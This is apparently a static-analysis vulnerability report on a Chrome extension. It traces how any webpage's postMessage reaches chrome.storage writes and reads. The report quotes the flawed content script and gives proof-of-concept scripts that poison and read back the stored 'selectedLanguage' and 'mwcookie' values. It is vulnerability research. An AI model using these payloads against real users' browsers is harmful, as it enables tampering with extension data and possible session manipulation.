# CoCo Analysis: ibjohbbainfaigcnbgfkjlgolmiaakjg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (2 storage.set, 2 storage.get→postMessage)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink (setLanguage)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ibjohbbainfaigcnbgfkjlgolmiaakjg/opgen_generated_files/cs_0.js
Line 643 `mwapi.prototype.onMultiwebMsg = function (e) {`
Line 645 `window.mwapi.execute(e.data);`
Line 736 `if (e.data.type == "setLanguage") {`
Line 737 `chrome.storage.local.set({ "selectedLanguage": e.data.selectedLanguage }, function () {`

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 634)
window.addEventListener('message', this.onMultiwebMsg);  // ← ANY webpage can post messages

// Message handler (Line 643-648)
mwapi.prototype.onMultiwebMsg = function (e) {
    try {
        window.mwapi.execute(e.data);  // ← attacker-controlled e.data
    } catch (e) {
        console.log(e)
    }
}

// Execute function (Line 727-784)
mwapi.prototype.execute = async function (e) {
    if (e.type == "req_cookie") {
        if (e.data.type == "setLanguage") {
            chrome.storage.local.set({ "selectedLanguage": e.data.selectedLanguage }, function () {  // ← attacker controls selectedLanguage
            });
            window.postMessage({ type: '_mw_language_', msg: e.data.selectedLanguage }, '*');
        }

        if (e.data.type == "getLanguage") {
            chrome.storage.local.get(["selectedLanguage"], function (items) {
                let lang = {selectedLanguage: selectedLanguage};
                if (items && items['selectedLanguage']) {
                    lang = items['selectedLanguage'];  // ← poisoned data retrieved
                }
                window.postMessage({ type: '_mw_language_', msg: lang }, '*');  // ← sent back to attacker
            });
        }
    }
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (ANY webpage can trigger)

**Attack:**

```javascript
// Malicious webpage injects arbitrary language setting
window.postMessage({
    type: "req_cookie",
    data: {
        type: "setLanguage",
        selectedLanguage: "MALICIOUS_PAYLOAD"
    }
}, '*');

// Then retrieve it back
window.postMessage({
    type: "req_cookie",
    data: {
        type: "getLanguage"
    }
}, '*');

// Listen for response
window.addEventListener('message', function(e) {
    if (e.data.type === '_mw_language_') {
        console.log("Retrieved poisoned data:", e.data.msg);
    }
});
```

**Impact:** Complete storage exploitation chain - attacker can poison storage with arbitrary selectedLanguage value and retrieve it back via postMessage, allowing information disclosure and data manipulation.

---

## Sink 2: cs_window_eventListener_message → chrome_storage_local_set_sink (mwcookie)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ibjohbbainfaigcnbgfkjlgolmiaakjg/opgen_generated_files/cs_0.js
Line 643 `mwapi.prototype.onMultiwebMsg = function (e) {`
Line 645 `window.mwapi.execute(e.data);`
Line 778 `if (e.data.type == "set") {`
Line 779 `chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () {`

**Code:**

```javascript
// Same entry point as Sink 1
window.addEventListener('message', this.onMultiwebMsg);

// Execute function handles cookie storage (Line 778-782)
if (e.data.type == "set") {
    chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () {  // ← attacker controls cookie
    });
    window.postMessage({ type: '_mw_cookie_', msg: e.data.cookie }, '*');  // ← echoed back
}

// Cookie retrieval (Line 767-774)
if (e.data.type == "get") {
    chrome.storage.local.get(["mwcookie"], function (items) {
        let ck = null;
        if (items && items['mwcookie']) {
            ck = items['mwcookie'];  // ← poisoned cookie retrieved
        }
        window.postMessage({ type: '_mw_cookie_', msg: ck }, '*');  // ← sent back to attacker
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Poison cookie storage
window.postMessage({
    type: "req_cookie",
    data: {
        type: "set",
        cookie: "ATTACKER_CONTROLLED_TOKEN"
    }
}, '*');

// Retrieve poisoned cookie
window.postMessage({
    type: "req_cookie",
    data: {
        type: "get"
    }
}, '*');

// Listen for response
window.addEventListener('message', function(e) {
    if (e.data.type === '_mw_cookie_') {
        console.log("Retrieved poisoned cookie:", e.data.msg);
    }
});
```

**Impact:** Complete storage exploitation chain - attacker can poison authentication cookies and retrieve them, potentially hijacking user sessions or manipulating application state.

---

## Sink 3 & 4: storage_local_get_source → window_postMessage_sink

These are the retrieval paths already documented above that complete the exploitation chains for Sinks 1 and 2. Both allow attackers to retrieve poisoned storage data via window.postMessage.

